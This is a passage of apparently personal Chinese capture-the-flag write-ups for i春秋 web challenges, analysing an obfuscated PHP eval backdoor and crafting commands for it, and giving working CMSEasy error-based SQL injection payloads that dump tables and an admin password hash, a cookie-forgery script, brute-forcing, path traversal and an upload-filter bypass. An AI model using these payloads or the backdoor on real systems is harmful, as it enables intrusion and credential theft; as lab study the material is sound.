class="line">   parse_str($u[<span class="string">&quot;query&quot;</span>],$q);<span class="comment">//这里就是要让我们传参数参数名都可以，这里是要跟下面打配合的</span></span><br><span class="line">   $q=array_values($q);</span><br><span class="line">   preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);<span class="comment">//这里匹配的内容是任意一个字母 匹配任意一个字母和符号- 匹配;q=0.加上一个数字，接下来还会建立三个数组，一个就是根据上面的匹配内容，第二个是放置所有匹配内容的首字母，第三个是放置所有匹配内容当中的数字内容</span></span><br><span class="line">   <span class="keyword">if</span>($q&amp;&amp;$m)</span><br><span class="line">   &#123;  </span><br><span class="line">      @session_start();</span><br><span class="line">      $s=&amp;$_SESSION;</span><br><span class="line">      $ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">      $sl=<span class="string">&quot;strtolower&quot;</span>; </span><br><span class="line">      $i=$m[<span class="number">1</span>[<span class="number">0</span>].$m[<span class="number">1</span>[<span class="number">1</span>];</span><br><span class="line">      $h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));<span class="comment">//得到数值675</span></span><br><span class="line">      $f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));<span class="comment">//a3e</span></span><br><span class="line">      $p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">       <span class="keyword">for</span>($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)</span><br><span class="line">            $p.=$q[$m[<span class="number">2</span>][$z]];<span class="comment">//这里$q的下标来自于$m最后的一组里面的数字，看了一下，只有在4的时候才为3，所以上面的query需要传入三个数值</span></span><br><span class="line">            <span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>) <span class="comment">//判断$p的前三个值是否为$p如果是往下       </span></span><br><span class="line">                &#123;</span><br><span class="line">                    $s[$i]=<span class="string">&quot;&quot;</span>;<span class="comment">//进来这个判断是必须的，这样才会绕过下面那个判断，此时$s:&#123;zz =&gt; &quot;&quot;&#125;[1]</span></span><br><span class="line">                     $p=$ss($p,<span class="number">3</span>);<span class="comment">//截取从第三个字符以后</span></span><br><span class="line">                            &#125;</span><br><span class="line">            <span class="keyword">if</span>(array_key_exists($i,$s))</span><br><span class="line">                &#123;</span><br><span class="line">                    $s[$i].=$p;</span><br><span class="line">                    $e=strpos($s[$i],$f);</span><br><span class="line">                    <span class="keyword">if</span>($e)<span class="comment">//判断a3e是否在输入的数据当中</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            $k=$kh.$kf;ob_start();</span><br><span class="line">                            @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));<span class="comment">//正则替换后进行异或运算再解码解压</span></span><br><span class="line">                            $o=ob_get_contents();<span class="comment">//eval执行内容传入o</span></span><br><span class="line">                            ob_end_clean();</span><br><span class="line">                            $d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">                            <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>););</span><br><span class="line">                            @session_destroy();</span><br><span class="line">             &#125;</span><br><span class="line">               &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>感动到热泪盈眶，为啥没有早点用phpstorm，用了这个工具，在审计代码的过程中变得好简单！！！<br>代码审计完后，接下来我们需要操作的就是构造我们的payload，这里可以直接用php写一个加密函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>)</span></span><br><span class="line"><span class="function"></span>&#123;   $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++)</span><br><span class="line">           &#123;</span><br><span class="line">             $o.=$t[$i]^$k[$j];</span><br><span class="line">                &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> $o; &#125;</span><br><span class="line">$o=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<span class="comment">//记得后面加分号</span></span><br><span class="line">$k=<span class="string">&quot;4f7f28d7&quot;</span>;</span><br><span class="line">$c=<span class="string">&quot;TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT&quot;</span>;<span class="comment">//这个是得到的回显</span></span><br><span class="line">$d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">$c=@gzuncompress(@x(@base64_decode($c),$k));<span class="comment">//这是解密代码</span></span><br><span class="line"><span class="keyword">print</span>($d);</span><br><span class="line"><span class="keyword">print</span>($c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210306224214.png" alt="img" style="zoom:67%;">
这边有几点需要注意一下:
1.传入的参数的个数，我们上面有个循环$p.=$q[$m\[2][$z]];因为有这个存在，所以需要注意language那一栏的个数，防止p没有获取到我们的代码导致后面的判断过不去
2.这里的referer需要自己添加一下
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210306224433.png" alt="img" style="zoom:67%;">
接下来我们就直接catflag 但是那边有个正则替换式，该怎么绕过_呢？但其实不用绕过来着，经过base64编码后我们的语句中已经没有\_之类的东西了，
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210307120640.png" alt="img" style="zoom:67%;">
这是经过测试以后的可以看到在eval中执行的内容已经是OK的语句了
那为啥在网页端执行不出来呢，查看源码也没有？找了几个wp，有一个也是这种情况，最后在linux系统就可以执行了！我尝试了一下，也可以了<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210307125929.png" alt="img" style="zoom:67%;">

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>没想到用了phpstorm这么方便，有时间一定要回去重做一些代码审计题</p>
<h2 id="web——信息收集"><a href="#web——信息收集" class="headerlink" title="web——信息收集"></a>web——信息收集</h2><p>flag3:p0rtant_hack}——通过目录.index.php.swp得到<br>flag2:s_v3ry_im .——通过index.php~得到<br>flag1:n1book{info_1——通过robots.txt得到<br>做到现在感觉最简单的题目了吧。。</p>
]]></content>
  </entry>
  <entry>
    <title>i春秋4</title>
    <url>/2021/02/16/i%E6%98%A5%E7%A7%8B4/</url>
    <content><![CDATA[<h2 id="web——123"><a href="#web——123" class="headerlink" title="web——123"></a>web——123</h2><p>找了一下，发现一个提示，用户信息在user.php当中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216130611.png" alt="img" style="zoom:67%;"></p>
<p>但是当我直接打开user.php的时候，啥也没有，尝试了一下发现了user.php.bak文件，下载打开</p>
<p>这里需要说一下：这里属于备份隐私文件泄露，后缀之前有整理过了 <a id="more"></a><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216133106.png" alt="img"></p>
<p>打开以后，里面均为用户信息，结合提示密码为用户名加出生日期，但是由于没有提供出生日期，只有用户名，所以我们就将年龄设置一下直接跑用户名就行，如下：<br>这里学一下如何用burp同时爆破两个变量 ，选择<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216134036.png" alt="img"><br>这个模式即可<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216134151.png" alt="img" style="zoom:67%;"></p>
<p>其他模式参考：<a href="https://blog.csdn.net/qq_39101049/article/details/90234669">https://blog.csdn.net/qq_39101049/article/details/90234669</a><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216134242.png" alt="img" style="zoom:67%;"><br>发现这个人的账号密码是OK的 登录试试<br>一片空白，查看源码：<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216134547.png" alt="img" style="zoom:67%;"></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216135750.png" alt="img"><br>由于这里被注释了，所以我们需要再创建一个，然后页面上就会出现文件上传的入口了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216135842.png" alt="img"></p>
<p>上传php文件，发现存在过滤，但是不知道是不是白名单，尝试一下其他文件类型<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216142508.png" alt="img" style="zoom:67%;"><br>尝试了好几种发现没有结果，感觉还挺奇怪的，可能因为是他的代码里面写的是检测第一个.后面的内容是否包含白名单文件吧，因为是题目，所以第二点号后面如果为pht，phtml的时候但是不能包含php3的时候文件才会被成功上传，尽管你上传白名单的那三个文件，也是会返回说文件名不合法的，到了这里，其实就是尝试了，也没啥好说的，感觉可以做一个字典，后缀字典，到时候跑一下就行了。。。<br>一开始有点定性思维，认为是apache解析漏洞，从右到左进行判断，所以我构造的都是123.php.jpg之类的文件，尝试了好多种组合都无果，最后看了一下wp才知道。。。果然还是要多刷题</p>
<p>当我打开这个文件的时候<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216143253.png" alt="img" style="zoom:67%;"><br>在看了一下源码，和报文，没有其他收获，试试是不是文件包含吧？因为这个时候也只有这种可能了<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210216143448.png" alt="img"><br>他一开始说过滤了flag，在尝试了大小写混写以后，发现复写flag就可以绕过了</p>
<h2 id="web——YeserCMS"><a href="#web——YeserCMS" class="headerlink" title="web——YeserCMS"></a>web——YeserCMS</h2><p>查找漏洞题。。。看一下网站框架在评论区看到<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210218151939.png" alt="img"><br>百度查找cmseasy漏洞，接下来就看着操作了。。。<br>漏洞出现在parse_str($sQuery,$aArray);<br>所以 可以进行报错注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">elive/live/header.php</span><br><span class="line">post：</span><br><span class="line">xajax=Postdata&amp;xajaxargs[<span class="number">0</span>]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx<span class="string">&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(database())) ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</span></span><br><span class="line"><span class="string">//这里使用报错注入，</span></span><br></pre></td></tr></table></figure>

<p>所以 跳转：<br><a href="http://3f50fc9615c747578e1c6fd0a4a9d076c1687d99683d45b6.changame.ichunqiu.com//celive/live/header.php">http://3f50fc9615c747578e1c6fd0a4a9d076c1687d99683d45b6.changame.ichunqiu.com//celive/live/header.php</a><br>然后post发送一下以上payload：<br>得到</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210218153001.png" alt="img" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT&#x2F;**&#x2F;GROUP_CONCAT(table_name) from information_schema.tables where table_schema&#x3D;database()) ,720,900),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure>

<p>以上是爆表，由于一次性显示的字符数有限制，所以，在不断更换后面的显示段数，找到了user表<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210218155235.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=<span class="tag">&lt;<span class="name">xjxquery</span>&gt;</span><span class="tag">&lt;<span class="name">q</span>&gt;</span>detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT((column_name)) from information_schema.columns where table_name=&#x27;yesercms_user&#x27;) ,1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL)-- <span class="tag">&lt;/<span class="name">q</span>&gt;</span><span class="tag">&lt;/<span class="name">xjxquery</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210218155606.png" alt="img" style="zoom:67%;">
接下来就是拿到账号密码了admin ff512d4240cbbdeafada404677ccbe61

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=<span class="tag">&lt;<span class="name">xjxquery</span>&gt;</span><span class="tag">&lt;<span class="name">q</span>&gt;</span>detail=xxxxxx&#x27;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,password)) from yesercms_user) ,10,42),0x5d),1)),NULL,NULL,NULL,NULL,NULL)-- <span class="tag">&lt;/<span class="name">q</span>&gt;</span><span class="tag">&lt;/<span class="name">xjxquery</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>密码为md5加密，解密完以后是Yeser231</p>
<p>成功登陆以后，在网页中寻找可以打开flag.php的地方，利用burpsuit抓包修改参数即可<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210218161924.png" alt="img" style="zoom:67%;"></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210218161823.png" alt="img" style="zoom:67%;"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210218160744.png" alt="img"></p>
<h2 id="web——Code"><a href="#web——Code" class="headerlink" title="web——Code"></a>web——Code</h2><p>图片后面是经过base64加密，解密以后可得：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="comment">/**  </span></span><br><span class="line"><span class="comment">* Created by PhpStorm.  </span></span><br><span class="line"><span class="comment">* Date: 2015/11/16    </span></span><br><span class="line"><span class="comment">* Time: 1:31      </span></span><br><span class="line"><span class="comment">*/</span>          header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);      </span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">&#x27;jpg&#x27;</span>]))            </span><br><span class="line">   header(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=hei.jpg&#x27;</span>);        </span><br><span class="line">$file = $_GET[<span class="string">&#x27;jpg&#x27;</span>];            </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;title&gt;file:&#x27;</span>.$file.<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;          </span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, $file);        </span><br><span class="line">$file = str_replace(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;_&quot;</span>, $file);          </span><br><span class="line">$txt = base64_encode(file_get_contents($file));            </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.$txt.<span class="string">&quot;&#x27;&gt;/&lt;/img&gt;&quot;</span>;         </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Can you find the flag file?</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面信息可得到，为phpstorm创建所得，phpstorm是php代码的集成开发环境，下载phpstorm，并新建一个项目，会发现在项目文件夹里面会生成一个.idea文件，它存储了项目的配置文件，</p>
<p>打开.idea文件可以发现misc.xml,modules.xml,workspace.xml文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a8af39458fca4aa7a15a802e4b9f189cfb7d36988dba497a.changame.ichunqiu.com&#x2F;.idea&#x2F;workspace.xml</span><br></pre></td></tr></table></figure>

<p>打开此URL，看到配置文件，发现fl3g_ichuqiu.php文件打开它看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a8af39458fca4aa7a15a802e4b9f189cfb7d36988dba497a.changame.ichunqiu.com&#x2F;index.php?jpg&#x3D;fl3gconfigichuqiu.php</span><br></pre></td></tr></table></figure>

<p>因为上面说可以用config替换_在我直接使用_的时候是打不开的，当我变成config才能打开。。，然后就又会看到一段使用base64编码的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];<span class="comment">//生成随机数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;<span class="comment">//返回随机数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$txt,$key</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);<span class="comment">//ord返回10进制，chr返回相对应于 ascii 所指定的单个字符。此函数与 ord() 是互补的</span></span><br><span class="line">    &#125;</span><br><span class="line">    $txt = $tmp;<span class="comment">//tmp是原本的txt十进制+10以后的数值</span></span><br><span class="line">    $rnd=random(<span class="number">4</span>);<span class="comment">//调用random函数，取得四位随机数，这个就是下面解密所需要截取的前四位</span></span><br><span class="line">    $key=md5($rnd.$key);<span class="comment">//将rnd和key拼接后md5加密</span></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $ttmp .= $txt[$i] ^ $key[++$s];<span class="comment">//ttmp是txt和key异或后的数值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp); <span class="comment">//返回的是rnd和ttmp</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$txt,$key</span>)</span>&#123;</span><br><span class="line">    $txt=base64_decode($txt);</span><br><span class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</span><br><span class="line">    $txt = substr($txt,<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line"></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $tmp .= $txt[$i]^$key[++$s];<span class="comment">//进行异或运算</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp1;</span><br><span class="line">&#125;</span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">&#x27;user&#x27;</span>],$key);</span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">&#x27;system&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">&#x27;user&#x27;</span>,encrypt(<span class="string">&#x27;guest&#x27;</span>,$key));</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;a??(a?ˉa??a?°)a?-&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>求解思路：先对system使用ord和chr+10，然后再和key进行异或，就可以得到txt，而txt就是我们需要输入的内容<br>其中 key是未知的，所以key的求解需要我们从后面的setcookie中得到，用guest作为txt，用ord和chr各加10，得到tmp，此时的txt就等于tmp了，rnd是一个四位的随机数，和key拼接后md5加密得到一个新的key，要得到这个新的key，可以通过使用返回的cookie和tmp异或运算得到</p>
<p>传送个cookie值，要让他经过一系列的解码运算后等于system</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210219012828.png" alt="img" style="zoom:67%;">
我们打开fl3g_ichunqiu.php，会发现他有那个user的cookie，接下来编写脚本:

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://b500619026b94e8ab02418c859eee290591d7abb431148af.changame.ichunqiu.com/fl3g_ichuqiu.php&quot;</span></span><br><span class="line">s= requests.session()</span><br><span class="line">return_user= s.get(url).cookies[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">de_user=base64.b64decode(return_user).decode(<span class="string">&#x27;Latin-1&#x27;</span>)</span><br><span class="line">rnd=de_user[<span class="number">0</span>:<span class="number">4</span>]<span class="comment">#四位随机数</span></span><br><span class="line">ttmp=de_user[<span class="number">4</span>:]</span><br><span class="line"><span class="comment">#print(ttmp)</span></span><br><span class="line">key=list(<span class="string">&#x27;xxxxxx&#x27;</span>)</span><br><span class="line">txt=list(<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">system=list(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(txt)):</span><br><span class="line">    txt[i]=chr(ord(txt[i])+<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(txt)):</span><br><span class="line">    key[i]=chr(ord(ttmp[i])^ord(txt[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system)):</span><br><span class="line">    system[i]=chr(ord(system[i])+<span class="number">10</span>)</span><br><span class="line">try_word=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">ttmp_new=<span class="string">&#x27;&#x27;</span></span><br><span class="line">cookie_system=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> try_word:</span><br><span class="line">    key[<span class="number">5</span>]=i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(system)):</span><br><span class="line">        ttmp_new +=chr(ord(key[j])^ord(system[j]))</span><br><span class="line">    str =base64.b64encode((rnd+ttmp_new).encode(<span class="string">&#x27;Latin-1&#x27;</span>))</span><br><span class="line">    print(str.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    cookie_system.append(base64.b64encode(str))</span><br><span class="line">    ttmp_new = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>关于脚本的编写，在理解完求解方式后，其实编写困难就在于语法了，在这里可以输出所有的结果，将它导出作为一个爆破字典，再用burp进行爆破即可</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210219143147.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210219143138.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210219143144.png" alt="img" style="zoom:67%;">

<p>最后解决一个问题：这个key为什么不会改变？明明在解密和加密的时候都出现了运算：<br>首先造成这个key改变的原因是什么？是rnd的变化，而rnd的变化只出现在加密当中，也就是当我们输入错误的cookie的时候他才会reset，但是我们利用burp进行重放攻击的时候，针对都是一样的cookie，相当于每次攻击完回到初始化，而我们在python中对于key的求解的时候，这个rnd它是不改变的，所以这个key也不会变化，在burp爆破进入加密时，由于这个rnd是截取我们的cookie前几位所以最终的key也是不变的。</p>
<h3 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h3><p>感觉对于python脚本的编写还不是很熟练，有些语法还不是很熟练。。不过现在也有感觉好像用的最多的是什么，然后审计代码的时候，果然还是要静下心来好好看才行</p>
]]></content>
  </entry>
  <entry>
    <title>i春秋5</title>
    <url>/2021/02/19/i%E6%98%A5%E7%A7%8B5/</url>
    <content><![CDATA[<h2 id="web——Zone"><a href="#web——Zone" class="headerlink" title="web——Zone"></a>web——Zone</h2><p>有个登录界面一开始让我们登录，试了一下不是sql注入，于是抓包查看，在cookie发现有个login=0，将其改成1，发现可以进入，打开manage页面，这里还是需要在burpsuit不断将login修改为1，最终即可进入，得到一个：<a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">manages&#x2F;admin.php?module&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;flag.php&amp;name&#x3D;</span><br></pre></td></tr></table></figure>

<p>比较类似于文件包含的url，一开始是../，发现不论几个都是出来的结果都一样，怀疑被过滤了，于是复写，发现页面就不一样了，接下来的目标是打开这个flag.php<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210219185057.png" alt="img" style="zoom:67%;"></p>
<p>在刚刚整理的敏感位置中的<br>/etc/passwd中可以看到这个是Nginx系统</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">nginx:</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure>

<p>在第一个配置文件中没有发现啥东西，在第二个配置文件中发现了一些网站目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">						server &#123;</span><br><span class="line">​	listen 80 default_server;</span><br><span class="line">​	listen [::]:80 default_server ipv6only&#x3D;on;</span><br><span class="line"></span><br><span class="line">	root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">	index index.php index.html index.htm;</span><br><span class="line">	</span><br><span class="line">	server_name localhost;</span><br><span class="line">	</span><br><span class="line">	location &#x2F; &#123;</span><br><span class="line">		try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">		location ~ \.php$ &#123;</span><br><span class="line">			fastcgi_split_path_info ^(.+\.php)(&#x2F;.+)$;</span><br><span class="line">			fastcgi_param  SCRIPT_FILENAME  &#x2F;var&#x2F;www&#x2F;html$fastcgi_script_name;</span><br><span class="line">			#fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php5-fpm.sock;</span><br><span class="line">			fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">			fastcgi_index index.php;</span><br><span class="line">			include fastcgi_params;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	error_page 404 &#x2F;404.html;</span><br><span class="line">	</span><br><span class="line">	error_page 500 502 503 504 &#x2F;50x.html;</span><br><span class="line">	location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">		root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;online-movies &#123;</span><br><span class="line">	        alias &#x2F;movie&#x2F;;</span><br><span class="line">	        autoindex on;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	location ~ &#x2F;\.ht &#123;</span><br><span class="line">		deny all;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="nginx服务器知识点"><a href="#nginx服务器知识点" class="headerlink" title="nginx服务器知识点"></a>nginx服务器知识点</h3><ol>
<li>nginx服务器的配置文件是nginx.conf，存储路径为<code>./etc/nginx/nginx.conf</code>；</li>
<li>一般服务器存放路径为<code>/var/www/html/</code>；</li>
<li>nginx.conf文件中，可以通过include其他路径文件来引用其他文件包含的配置，比如<code>include sites-enabled/default;</code>，这样做是为了把一些配置进行分类，方便在需要的时候快速启动或者关闭，这些路径是可变的，管理员可以自行设置；</li>
<li>nginx.conf文件中，如果配置了<code>autoindex on;</code>，那么说明这个路径可以进行浏览目录下载文件，例如<code>location /online-movies &#123; alias /movie/; autoindex on; &#125;</code>中，location /online-movies路径就可以浏览目录下载文件，全路径一般是<code>/etc/nginx/location/online-movies</code>；</li>
<li>文件遍历是指的一个目录，可以直接进行访问；</li>
<li>开启文件遍历权限的路径，在路径后边添加文件的相对路径就可以下载到文件，在可视化界面访问不到的文件也可以进行下载，比如<code>/var/www/html/flag.php</code></li>
</ol>
